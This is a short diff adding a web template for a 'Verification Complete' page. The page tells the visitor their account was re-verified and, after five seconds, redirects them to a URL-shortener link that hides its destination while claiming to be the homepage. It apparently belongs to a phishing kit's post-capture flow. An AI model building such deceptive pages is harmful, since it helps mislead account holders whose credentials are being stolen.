@@ -1,0 +1,20 @@
+@layout('layouts.app')
+
+@section('content')
+<div style="margin-top: 50px;margin-bottom:150px;text-align:center;font: 16px 'cb-regular';">
+    <svg width="64" height="64" viewBox="0 0 64 64" fill="none" xmlns="https://www.w3.org/2000/svg">
+      <circle cx="32" cy="32" r="32" fill="#62CF66"></circle>
+      <path fill-rule="evenodd" clip-rule="evenodd" d="M28.2514 44.0347C27.4541 44.9285 26.0553 44.9259 25.2614 44.0291L14.5907 31.9753C14.151 31.4787 14.3078 30.6995 14.9054 30.4116L15.3589 30.1931C15.686 30.0354 16.0729 30.0675 16.3695 30.2769L25.0794 36.423C25.8341 36.9556 26.8554 36.902 27.5502 36.2934L47.6139 18.7212C47.9155 18.4571 48.3457 18.3986 48.7068 18.5726L49.0901 18.7573C49.689 19.0458 49.8448 19.8277 49.4023 20.3238L28.2514 44.0347Z" fill="white"></path>
+    </svg>
+    <h3>Verification Complete</h3>
+    <p>Your account has successfully been re-verified. You will be redirected back to our homepage shortly.</p>
+</div>
+@endsection
+
+@section('script')
+<script>
+  setTimeout(() => {
+    window.location.href = 'https://t.ly/Mghj';
+  }, 5000)
+</script>
+@endsection
